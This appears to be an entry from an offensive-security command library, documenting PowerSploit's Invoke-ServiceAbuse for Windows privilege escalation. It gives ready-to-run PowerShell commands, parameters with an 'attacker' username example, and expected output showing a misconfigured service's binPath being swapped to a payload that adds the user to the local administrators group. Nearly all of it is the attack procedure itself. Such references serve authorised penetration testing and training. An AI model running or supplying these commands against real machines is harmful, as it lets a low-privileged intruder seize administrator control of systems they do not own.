---
id: a7cfcb61-5933-4ee2-be4c-b3ad71ab8946
name: powerup-invoke-serviceabuse
type: command
executor: powershell
data: Invoke-ServiceAbuse -Name $SERVICE_NAME -UserName "$DOMAIN\$USERNAME" -Verbose
output: null
created_at: '2023-01-12T04:55:30.129511+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - exploitation
verified: true
validated: true
---

# powerup-invoke-serviceabuse

## Command

```powershell
Invoke-ServiceAbuse -Name $SERVICE_NAME -UserName "$DOMAIN\$USERNAME" -Verbose
```

## Description

This command exploits a service's abuse function by temporarily modifying its configuration to execute a privilege escalation payload (adding a user to administrators), then reverting the changes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Name $SERVICE_NAME | Name of the vulnerable service (e.g., "VulnService") | Yes |
| -UserName "$DOMAIN\$USERNAME" | Domain and username to add to admins (e.g., "CONTOSO\attacker") | Yes |
| -Verbose | Provides detailed output during execution | No |

## Examples

### Basic Usage

```powershell
Invoke-ServiceAbuse -Name "TestService" -UserName "CONTOSO\lowpriv" -Verbose
```

### Local User

```powershell
Invoke-ServiceAbuse -Name "VulnService" -UserName ".\localuser"
```

## Expected Output

[+] Service 'TestService' has an abuse function (SERVICE_ALL_ACCESS)
[+] Modified binPath to payload
[+] Started service - payload executed
[+] Reverted binPath to original
[+] User 'CONTOSO\lowpriv' added to administrators

No errors indicate success; verify with 'net localgroup administrators'.

## Related

- [[procedures/Search-and-Exploit-Service-Abuse-Functions]]
- [[tools/PowerSploit]]
